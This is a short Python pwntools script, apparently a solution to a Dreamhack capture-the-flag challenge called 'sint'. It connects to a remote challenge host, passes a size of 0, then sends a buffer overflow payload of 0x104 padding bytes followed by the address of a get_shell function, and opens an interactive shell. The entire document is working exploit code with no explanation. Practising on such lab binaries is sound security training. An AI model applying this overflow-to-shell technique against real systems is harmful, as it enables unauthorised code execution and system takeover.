from pwn import *

r = remote('host3.dreamhack.games', 20722)
e = ELF('./sint')

get_shell = e.symbols['get_shell']

payload = b'A' * 0x104
payload += p32(get_shell)

r.sendlineafter("Size: ", str(0))
r.sendlineafter("Data: ", payload)

r.interactive()
